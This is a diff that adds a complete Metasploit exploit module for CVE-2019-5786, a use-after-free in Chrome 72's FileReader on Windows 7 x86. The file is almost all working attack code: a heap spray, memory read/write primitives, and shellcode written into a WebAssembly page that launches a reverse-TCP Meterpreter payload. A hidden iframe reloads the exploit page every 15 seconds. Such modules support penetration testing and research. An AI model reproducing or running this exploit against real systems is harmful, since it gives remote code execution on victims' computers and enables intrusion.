@@ -1,0 +1,432 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ManualRanking
+
+  include Msf::Exploit::Remote::HttpServer
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Chrome 72.0.3626.119 FileReader UaF exploit for Windows 7 x86',
+      'Description'    => %q{
+        This exploit takes advantage of a use after free vulnerability in Google
+      Chrome 72.0.3626.119 running on Windows 7 x86.
+        The FileReader.readAsArrayBuffer function can return multiple references to the
+      same ArrayBuffer object, which can be freed and overwritten with sprayed objects.
+      The dangling ArrayBuffer reference can be used to access the sprayed objects,
+      allowing arbitrary memory access from Javascript. This is used to write and
+      execute shellcode in a WebAssembly object.
+        The shellcode is executed within the Chrome sandbox, so you must explicitly
+      disable the sandbox for the payload to be successful.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         => [
+          'Clement Lecigne', # discovery
+          'István Kurucsai', # Exodus Intel
+          'timwr',           # metasploit module
+        ],
+      'References'     => [
+          ['CVE', '2019-5786'],
+          ['URL', 'https://github.com/exodusintel/CVE-2019-5786'],
+          ['URL', 'https://blog.exodusintel.com/2019/03/20/cve-2019-5786-analysis-and-exploitation/'],
+          ['URL', 'https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/analysis-of-a-chrome-zero-day-cve-2019-5786/'],
+          ['URL', 'https://security.googleblog.com/2019/03/disclosing-vulnerabilities-to-protect.html'],
+        ],
+      'Arch'           => [ ARCH_X86 ],
+      'Platform'       => 'windows',
+      'DefaultTarget'  => 0,
+      'DefaultOptions' => { 'PAYLOAD' => 'windows/meterpreter/reverse_tcp' },
+      'Targets'        => [ [ 'Automatic', { } ] ],
+      'DisclosureDate' => 'Mar 21 2019'))
+  end
+
+  def on_request_uri(cli, request)
+    print_status("Sending #{request.uri}")
+    if request.uri =~ %r{/exploit.html$}
+      html = %Q^
+<html>
+    <head>
+        <script>
+let myWorker = new Worker('worker.js');
+let reader = null;
+spray = null;               // nested arrays used to hold the sprayed heap contents
+let onprogress_cnt = 0;     // number of times onprogress was called in a round
+let try_cnt = 0;            // number of rounds we tried
+let last = 0, lastlast = 0; // last two AB results from the read
+let tarray = 0;             // TypedArray constructed from the dangling ArrayBuffer
+const string_size = 128 * 1024 * 1024;
+let contents = String.prototype.repeat.call('Z', string_size);
+let f = new File([contents], "text.txt");
+const marker1 = 0x36313233;
+const marker2 = 0x37414546;
+
+const outers = 256;
+const inners = 1024;
+
+function allocate_spray_holders() {
+    spray = new Array(outers);
+    for (let i = 0; i < outers; i++) {
+        spray[i] = new Array(inners);
+    }
+}
+
+function clear_spray() {
+    for (let i = 0; i < outers; i++) {
+        for (let j = 0; j < inners; j++) {
+            spray[i][j] = null;
+        }
+    }
+}
+
+function reclaim_mixed() {
+    // spray the heap to reclaim the freed region
+    let tmp = {};
+    for (let i = 0; i < outers; i++) {
+        for (let j = 0; j + 2 < inners; j+=3) {
+            spray[i][j] = {a: marker1, b: marker2, c: tmp};
+            spray[i][j].c = spray[i][j]     // self-reference to find our absolute address
+            spray[i][j+1] = new Array(8);
+            spray[i][j+2] = new Uint32Array(32);
+        }
+    }
+}
+
+function find_pattern() {
+    const start_offset = 0x00afc000 / 4;
+    for (let i = start_offset; i + 1 < string_size / 4; i++) {
+        if (i < 50){
+            console.log(tarray[i].toString(16));
+        }
+        // multiply by two because of the way SMIs are stored
+        if (tarray[i] == marker1 * 2) {
+            if (tarray[i+1] == marker2 * 2) {
+                console.log(`found possible candidate objectat idx ${i}`);
+                return i;
+            }
+        }
+    }
+    return null;
+}
+
+
+function get_obj_idx(prop_idx) {
+    // find the index of the Object in the spray array
+    tarray[prop_idx] = 0x62626262;
+    for (let i = 0; i < outers; i++) {
+        for (let j = 0; j < inners; j+=1) {
+            try {
+                if (spray[i][j].a == 0x31313131) {
+                    console.log(`found object idx in the spray array: ${i} ${j}`);
+                    return spray[i][j];
+                }
+            } catch (e) {}
+        }
+    }
+}
+
+function ta_read(addr) {
+    // reads an absolute address through the original freed region
+    // only works for ta_absolute_addr + string_size (128MiB)
+    if (addr > ta_absolute_addr && addr < ta_absolute_addr + string_size) {
+        return tarray[(addr-ta_absolute_addr)/4];
+    }
+
+    return 0;
+}
+
+function ta_write(addr, value) {
+    // wrtie to an absolute address through the original freed region
+    // only works for ta_absolute_addr + string_size (128MiB)
+    if (addr % 4 || value > 2**32 - 1 ||
+        addr < ta_absolute_addr ||
+        addr > ta_absolute_addr + string_size) {
+        console.log(`invalid args passed to ta_write(${addr.toString(16)}, ${value}`);
+    }
+    tarray[(addr-ta_absolute_addr)/4] = value;
+}
+
+function get_corruptable_ui32a() {
+    // finds a sprayed Uint32Array, the elements pointer of which also falls into the controlled region
+    for (let i = 0; i < outers; i++) {
+        for (let j = 0; j + 2 < inners; j+=3) {
+            let ui32a_addr = addrof(spray[i][j+2]) - 1;
+            let bs_addr = ta_read(ui32a_addr + 12) - 1;
+            let elements_addr = ta_read(ui32a_addr + 8) - 1;
+            // read its elements pointer
+            // if the elements ptr lies inside the region we have access to
+            if (bs_addr >= ta_absolute_addr && bs_addr < ta_absolute_addr + string_size &&
+                elements_addr >= ta_absolute_addr && elements_addr < ta_absolute_addr + string_size) {
+                console.log(`found corruptable Uint32Array->elements at ${bs_addr.toString(16)}, on Uint32Array idx ${i} ${j}`);
+                return {
+                    bs_addr: bs_addr,
+                    elements_addr: elements_addr,
+                    ui32: spray[i][j+2],
+                    i: i, j: j
+                }
+            }
+        }
+    }
+}
+
+var reader_obj = null;
+var object_prop_taidx = null;
+var ta_absolute_addr = null;
+var aarw_ui32 = null;
+
+function addrof(leaked_obj) {
+    reader_obj.a = leaked_obj;
+    return tarray[object_prop_taidx];
+}
+
+
+function read4(addr) {
+    // save the old values
+    let tmp1 = ta_read(aarw_ui32.elements_addr + 12);
+    let tmp2 = ta_read(aarw_ui32.bs_addr + 16);
+
+    // rewrite the backing store ptr
+    ta_write(aarw_ui32.elements_addr + 12, addr);
+    ta_write(aarw_ui32.bs_addr + 16, addr);
+
+    let val = aarw_ui32.ui32[0];
+
+    ta_write(aarw_ui32.elements_addr + 12, tmp1);
+    ta_write(aarw_ui32.bs_addr + 16, tmp2);
+
+    return val;
+}
+
+function write4(addr, val) {
+    // save the old values
+    let tmp1 = ta_read(aarw_ui32.elements_addr + 12);
+    let tmp2 = ta_read(aarw_ui32.bs_addr + 16);
+
+    // rewrite the backing store ptr
+    ta_write(aarw_ui32.elements_addr + 12, addr);
+    ta_write(aarw_ui32.bs_addr + 16, addr);
+
+    aarw_ui32.ui32[0] = val;
+
+    ta_write(aarw_ui32.elements_addr + 12, tmp1);
+    ta_write(aarw_ui32.bs_addr + 16, tmp2);
+}
+
+function get_rw() {
+    // free up as much memory as possible
+    // spray = null;
+    // contents = null;
+    force_gc();
+
+    // attepmt reclaiming the memory pointed to by dangling pointer
+    reclaim_mixed();
+
+    // access the reclaimed region as a Uint32Array
+    tarray = new Uint32Array(lastlast);
+    object_prop_taidx = find_pattern();
+    if (object_prop_taidx === null) {
+        console.log('ERROR> failed to find marker');
+        window.top.postMessage(`ERROR> failed to find marker`, '*');
+        return;
+    }
+
+    // leak the absolute address of the Object
+    const obj_absolute_addr = tarray[object_prop_taidx + 2] - 1;  // the third property of the sprayed Object is self-referential
+    ta_absolute_addr = obj_absolute_addr - (object_prop_taidx-3)*4
+    console.log(`leaked absolute address of our object ${obj_absolute_addr.toString(16)}`);
+    console.log(`leaked absolute address of ta ${ta_absolute_addr.toString(16)}`);
+
+    reader_obj = get_obj_idx(object_prop_taidx);
+    if (reader_obj == undefined) {
+        console.log(`ERROR> failed to find object`);
+        window.top.postMessage(`ERROR> failed to find object`, '*');
+        return;
+    }
+    // now reader_obj is a reference to the Object, object_prop_taidx is the index of its first inline property from the beginning of tarray
+
+    console.log(`addrof(reader_obj) == ${addrof(reader_obj)}`);
+    aarw_ui32 = get_corruptable_ui32a();
+    // arbitrary read write up after this point
+}
+
+var wfunc = null;
+let meterpreter = unescape("#{Rex::Text.to_unescape(payload.encoded)}");
+
+function rce() {
+    function get_wasm_func() {
+        var importObject = {
+            imports: { imported_func: arg => console.log(arg) }
+        };
+        bc = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x60, 0x1, 0x7f, 0x0, 0x60, 0x0, 0x0, 0x2, 0x19, 0x1, 0x7, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0xd, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x0, 0x3, 0x2, 0x1, 0x1, 0x7, 0x11, 0x1, 0xd, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x1, 0xa, 0x8, 0x1, 0x6, 0x0, 0x41, 0x2a, 0x10, 0x0, 0xb];
+        wasm_code = new Uint8Array(bc);
+        wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), importObject);
+        return wasm_mod.exports.exported_func;
+    }
+
+    let wasm_func = get_wasm_func();
+    wfunc = wasm_func;
+    // traverse the JSFunction object chain to find the RWX WebAssembly code page
+    let wasm_func_addr = addrof(wasm_func) - 1;
+    let sfi = read4(wasm_func_addr + 12) - 1;
+    let WasmExportedFunctionData = read4(sfi + 4) - 1;
+    let instance = read4(WasmExportedFunctionData + 8) - 1;
+    let rwx_addr = read4(instance + 0x74);
+
+    // write the shellcode to the RWX page
+    if (meterpreter.length % 2 != 0)
+        meterpreter += "\\u9090";
+
+    for (let i = 0; i < meterpreter.length; i += 2) {
+        write4(rwx_addr + i*2, meterpreter.charCodeAt(i) + meterpreter.charCodeAt(i + 1) * 0x10000);
+    }
+
+    // if we got to this point, the exploit was successful
+    window.top.postMessage('SUCCESS', '*');
+    console.log('success');
+    wfunc();
+
+    // invoke the shellcode
+    //window.setTimeout(wfunc, 1000);
+}
+
+function force_gc() {
+    // forces a garbage collection to avoid OOM kills
+    try {
+        var failure = new WebAssembly.Memory({initial: 32767});
+    } catch(e) {
+        // console.log(e.message);
+    }
+}
+
+function init() {
+    abs = [];
+    tarray = 0;
+    onprogress_cnt = 0;
+    try_cnt = 0;
+    last = 0, lastlast = 0;
+    reader = new FileReader();
+
+    reader.onloadend = function(evt) {
+        try_cnt += 1;
+        failure = false;
+        if (onprogress_cnt < 2) {
+            console.log(`less than 2 onprogress events triggered: ${onprogress_cnt}, try again`);
+            failure = true;
+        }
+
+        if (lastlast.byteLength != f.size) {
+            console.log(`lastlast has a different size than expected: ${lastlast.byteLength}`);
+            failure = true;
+        }
+
+        if (failure === true) {
+            console.log('retrying in 1 second');
+            window.setTimeout(exploit, 1);
+            return;
+        }
+
+        console.log(`onloadend attempt ${try_cnt} after ${onprogress_cnt} onprogress callbacks`);
+        try {
+            // trigger the FREE
+            myWorker.postMessage([last], [last, lastlast]);
+        } catch(e) {
+            // an exception with this message indicates that the FREE part of the exploit was successful
+            if (e.message.includes('ArrayBuffer at index 1 could not be transferred')) {
+                get_rw();
+                rce();
+                return;
+            } else {
+                console.log(e.message);
+            }
+        }
+    }
+    reader.onprogress = function(evt) {
+        force_gc();
+        let res = evt.target.result;
+        // console.log(`onprogress ${onprogress_cnt}`);
+        onprogress_cnt += 1;
+        if (res.byteLength != f.size) {
+            // console.log(`result has a different size than expected: ${res.byteLength}`);
+            return;
+        }
+        lastlast = last;
+        last = res;
+    }
+    if (spray === null) {
+        // allocate the spray holders if needed
+        allocate_spray_holders();
+    }
+
+    // clear the spray holder arrays
+    clear_spray();
+
+    // get rid of the reserved ArrayBuffer range, as it may interfere with the exploit
+    try {
+        let failure = new ArrayBuffer(1024 * 1024 * 1024);
+    } catch (e) {
+        console.log(e.message);
+    }
+
+    force_gc();
+}
+
+function exploit() {
+    init();
+    reader.readAsArrayBuffer(f);
+    console.log(`attempt ${try_cnt} started`);
+}
+        </script>
+    </head>
+    <body onload="exploit()">
+    </body>
+</html>
+    ^
+      send_response(cli, html)
+    elsif request.uri =~ %r{/worker.js$}
+      send_response(cli, 'onmessage = function (msg) { }')
+    else
+      uripath = datastore['URIPATH'] || get_resource
+      uripath += '/' unless uripath.end_with? '/'
+      html = %Q^
+<html>
+    <head>
+        <script>
+            function iter() {
+                let iframe = null;
+                try {
+                    iframe = document.getElementById('myframe');
+                    document.body.removeChild(iframe);
+                } catch (e) {}
+
+                iframe = document.createElement('iframe');
+                iframe.src = '#{uripath}exploit.html';
+                iframe.id = 'myframe';
+                iframe.style = "width:0; height:0; border:0; border:none; visibility=hidden"
+                document.body.appendChild(iframe);
+                console.log(document.getElementById('myframe'));
+            }
+
+            function brute() {
+                window.setTimeout(iter, 1000);
+                let interval = window.setInterval(iter, 15000);
+
+                window.onmessage = function(e) {
+                    if (e.data.includes('SUCCESS')) {
+                        console.log('exploit successful!');
+                        window.clearInterval(interval);
+                    }
+                    console.log(e);
+                }
+            }
+        </script>
+    </head>
+    <body onload="brute()"></body>
+</html>
+    ^
+      send_response(cli, html)
+    end
+  end
+
+end
